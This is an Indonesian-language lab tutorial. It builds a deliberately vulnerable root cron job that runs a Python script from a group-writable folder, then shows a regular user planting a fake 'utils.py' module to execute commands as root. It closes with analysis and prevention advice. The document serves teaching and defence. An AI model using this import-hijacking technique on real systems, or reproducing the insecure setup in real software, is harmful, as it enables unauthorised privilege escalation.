# Lab: Cron Job Abuse menggunakan Python (Import Hijacking)

> **Tujuan Lab**: Memahami bagaimana cron job yang menjalankan script Python dapat dieksploitasi melalui *import hijacking* untuk mendapatkan akses **root**.

⚠️ **Catatan**: Lakukan hanya di VM / lab pribadi.

---

## 1. Skenario

* Sistem Linux
* Terdapat cron job yang dijalankan sebagai **root**
* Cron menjalankan script Python
* Folder script bersifat **group-writable**

---

## 2. Membuat Script Python (sebagai root)

Buat direktori aplikasi:

```bash
sudo mkdir -p /opt/app
```

Buat script Python:

```bash
sudo nano /opt/app/backup.py
```

Isi file:

```python
import os
import utils

os.system("echo Backup berjalan")
```

---

## 3. Konfigurasi Permission (Kerentanan)

Buat group dan masukkan user:

```bash
sudo groupadd dev
sudo usermod -aG dev user1
```

Atur permission folder:

```bash
sudo chown -R root:dev /opt/app
sudo chmod -R 775 /opt/app
```

➡️ User dalam group `dev` dapat menulis file di `/opt/app`

---

## 4. Menambahkan Cron Job (sebagai root)

Edit crontab root:

```bash
sudo crontab -e
```

Tambahkan:

```bash
* * * * * /usr/bin/python3 /opt/app/backup.py
```

Cron akan berjalan setiap 1 menit sebagai **root**.

---

## 5. Eksploitasi (sebagai user biasa)

Login sebagai `user1`, lalu buat module palsu:

```bash
nano /opt/app/utils.py
```

Isi file:

```python
import os
os.system("id > /tmp/pwned")
```

---

## 6. Hasil Eksploitasi

Tunggu ±1 menit, lalu cek:

```bash
cat /tmp/pwned
```

Jika berhasil, output akan menunjukkan:

```bash
uid=0(root) gid=0(root)
```

➡️ Perintah dijalankan sebagai **root** melalui cron job.

---

## 7. Analisis

* Python akan mengimpor module dari direktori script terlebih dahulu
* Module `utils.py` buatan user menggantikan module asli
* Cron menjalankan script sebagai root

➡️ Terjadi **Privilege Escalation**

---

## 8. Kesimpulan

Cron job yang menjalankan script Python dapat menjadi celah keamanan apabila direktori atau module Python dapat dimodifikasi oleh user biasa.

---

## 9. Pencegahan

* Jangan gunakan folder writable untuk script cron
* Gunakan absolute import dan virtual environment
* Audit cron job secara berkala
* Terapkan prinsip *least privilege*

---
